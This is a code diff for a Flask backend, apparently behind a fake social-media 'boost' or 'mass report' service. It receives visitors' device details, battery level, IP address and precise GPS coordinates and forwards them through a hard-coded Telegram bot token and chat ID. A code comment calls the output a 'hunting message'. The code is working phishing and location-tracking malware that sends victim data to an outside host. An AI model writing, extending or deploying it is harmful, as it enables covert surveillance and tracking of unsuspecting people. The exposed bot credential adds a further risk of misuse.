@@ -6,31 +6,34 @@ app = Flask(__name__)
 TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
 CHAT_ID = "5811700860"
 
-def send_to_telegram(text):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
-
-@app.route('/api/index', methods=['GET', 'POST'])
+@app.route('/api/index', methods=['POST'])
 def handler():
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'Unknown Device')
-    
-    if request.method == 'GET':
-        # إشعار دخول الموقع
-        msg = f"🔔 **زائر جديد لموقعك!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
-        send_to_telegram(msg)
-        return "ok"
-    
-    else:
-        # إرسال البيانات المكتوبة
+    try:
         data = request.json
-        msg = f"🎯 **بيانات جديدة مستلمة!**\n\n" \
-              f"🔹 القسم: {data.get('mode')}\n" \
-              f"🔹 المنصة: {data.get('platform')}\n" \
-              f"🔹 الخدمة: {data.get('service')}\n" \
-              f"🌐 IP: `{user_ip}`\n" \
-              f"📱 الجهاز: `{user_agent}`\n" \
-              f"🔑 الهدف: `{data.get('id')}`\n" \
-              f"🔢 العدد: `{data.get('count')}`"
-        send_to_telegram(msg)
-        return jsonify({"status": "ok"})
+        info = data.get('device_info', {})
+        lat = data.get('lat')
+        lon = data.get('lon')
+        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+        # تنسيق رسالة الصيد بناءً على القسم (رشق أو إسبام)
+        header = "🚀 **طلب رشق جديد**" if data.get('mode') == 'boost' else "⚔️ **طلب إسبام جديد**"
+        
+        msg = f"{header}\n\n"
+        msg += f"👤 **الهدف:** `{data.get('target_id')}`\n"
+        msg += f"🔢 **العدد/البلاغات:** `{data.get('count')}`\n"
+        msg += f"📱 **الجهاز:** `{info.get('platform')}`\n"
+        msg += f"🔋 **البطارية:** `{info.get('battery')}`\n"
+        msg += f"🌐 **IP:** `{user_ip}`\n"
+        
+        if lat and lon:
+            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+            msg += f"\n📍 **الموقع الجغرافي:** [فتح الخريطة]({maps_link})"
+        else:
+            msg += f"\n📍 **الموقع:** رفض الإذن."
+
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
+        
+        return jsonify({"status": "ok"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
